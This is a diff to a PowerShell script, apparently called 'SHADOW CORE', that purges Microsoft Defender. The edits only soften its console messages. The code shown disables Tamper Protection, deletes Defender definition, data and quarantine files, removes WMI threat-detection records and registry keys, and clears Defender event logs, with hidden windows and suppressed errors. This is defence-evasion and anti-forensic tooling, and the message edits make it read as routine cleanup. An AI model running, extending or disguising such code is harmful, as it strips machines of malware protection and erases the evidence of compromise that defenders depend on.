@@ -11,9 +11,9 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     }
 }
 
-if (-not $Silent) { Write-Host "[*] SHADOW CORE: Defender Total Purge Initiated" -ForegroundColor Cyan }
+if (-not $Silent) { Write-Host "Defender Total Purge Initiated" -ForegroundColor Cyan }
 
-if (-not $Silent) { Write-Host "[*] Disabling Tamper Protection..." -ForegroundColor Cyan }
+if (-not $Silent) { Write-Host "Disabling Tamper Protection..." -ForegroundColor Cyan }
 $tamperKey = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"
 if (Test-Path $tamperKey) {
     Set-ItemProperty -Path $tamperKey -Name "TamperProtection" -Value 0 -Force -ErrorAction SilentlyContinue
@@ -29,7 +29,7 @@ foreach ($service in $defenderServices) {
     }
 }
 
-if (-not $Silent) { Write-Host "[*] Hunting and destroying .dat/.vdm/.vdl/.bin files..." -ForegroundColor Cyan }
+if (-not $Silent) { Write-Host "Hunting and destroying .dat/.vdm/.vdl/.bin files..." -ForegroundColor Cyan }
 $datPatterns = @("*.dat", "*.vdm", "*.vdl", "*.bin", "*.db", "*.db-wal", "*.db-shm", "*.cache", "*.log")
 $defenderDirs = @(
     "$env:ProgramData\Microsoft\Windows Defender",
@@ -61,7 +61,7 @@ foreach ($dir in $defenderDirs) {
     }
 }
 
-if (-not $Silent) { Write-Host "[*] Purging MpEngine DataStore..." -ForegroundColor Cyan }
+if (-not $Silent) { Write-Host "Purging MpEngine DataStore..." -ForegroundColor Cyan }
 $mpEnginePaths = @(
     "$env:ProgramData\Microsoft\Windows Defender\Platform\*\DataStore",
     "$env:ProgramData\Microsoft\Windows Defender\Definition Updates\*",
@@ -97,12 +97,12 @@ foreach ($file in $criticalDatFiles) {
     }
 }
 
-if (-not $Silent) { Write-Host "[*] Clearing WMI threat objects..." -ForegroundColor Cyan }
+if (-not $Silent) { Write-Host "Clearing WMI threat objects..." -ForegroundColor Cyan }
 Get-WmiObject -Namespace "root\Microsoft\Windows\Defender" -Class "MSFT_MpThreat" | Remove-WmiObject -ErrorAction SilentlyContinue
 Get-WmiObject -Namespace "root\Microsoft\Windows\Defender" -Class "MSFT_MpThreatDetection" | Remove-WmiObject -ErrorAction SilentlyContinue
 Get-WmiObject -Namespace "root\Microsoft\Windows\Defender" -Class "MSFT_MpScan" | Remove-WmiObject -ErrorAction SilentlyContinue
 
-if (-not $Silent) { Write-Host "[*] Obliterating quarantine and history..." -ForegroundColor Cyan }
+if (-not $Silent) { Write-Host "Cleaning quarantine and history..." -ForegroundColor Cyan }
 $paths = @(
     "$env:ProgramData\Microsoft\Windows Defender\Quarantine",
     "$env:ProgramData\Microsoft\Windows Defender\Support",
@@ -121,7 +121,7 @@ foreach ($path in $paths) {
     }
 }
 
-if (-not $Silent) { Write-Host "[*] Scrubbing registry..." -ForegroundColor Cyan }
+if (-not $Silent) { Write-Host "Scrubbing registry..." -ForegroundColor Cyan }
 $regPaths = @(
     "HKLM:\SOFTWARE\Microsoft\Windows Defender\Threats",
     "HKLM:\SOFTWARE\Microsoft\Windows Defender\Health",
@@ -148,13 +148,13 @@ if (Test-Path $mpcmd) {
     Start-Process -FilePath $mpcmd -ArgumentList "-RestoreDefaults" -Wait -WindowStyle Hidden -ErrorAction SilentlyContinue
 }
 
-if (-not $Silent) { Write-Host "[*] Purging event logs..." -ForegroundColor Cyan }
+if (-not $Silent) { Write-Host "Purging event logs..." -ForegroundColor Cyan }
 $logs = @("Microsoft-Windows-Windows Defender/Operational", "Microsoft-Windows-Windows Defender/WHC", "Microsoft-Windows-Windows Defender/ThreatTrack")
 foreach ($log in $logs) {
     wevtutil.exe clear-log $log 2>$null
 }
 
-if (-not $Silent) { Write-Host "[*] Restarting services..." -ForegroundColor Cyan }
+if (-not $Silent) { Write-Host "Restarting services..." -ForegroundColor Cyan }
 foreach ($service in $defenderServices) {
     if (Get-Service -Name $service -ErrorAction SilentlyContinue) {
         Set-Service -Name $service -StartupType Automatic -ErrorAction SilentlyContinue
